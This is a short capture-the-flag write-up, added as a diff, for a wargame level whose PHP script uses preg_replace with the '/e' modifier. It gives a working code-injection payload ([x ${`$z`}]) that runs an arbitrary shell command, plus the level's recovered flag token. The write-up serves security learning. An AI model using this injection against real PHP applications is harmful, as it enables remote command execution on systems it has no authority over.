@@ -1,0 +1,21 @@
+There is a php script and an executable. The interesting line is:
+
+```$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);```
+
+It will search for '[x <anything>]' and will evaluate 'y(<anything>)' as php
+code because of the '/e' flag.
+
+Since it will be evaluated, we can embed a command and expand it with
+${`function`}
+
+We can then create a file that contains the following to execute the command
+given as second argument:
+
+```[x ${`$z`}]```
+
+Finally execute './level06 <file> getflag'
+
+-----------------------------------------------
+flag06 password:
+token:				wiok45aaoguiboiki2tuin6ub
+-----------------------------------------------
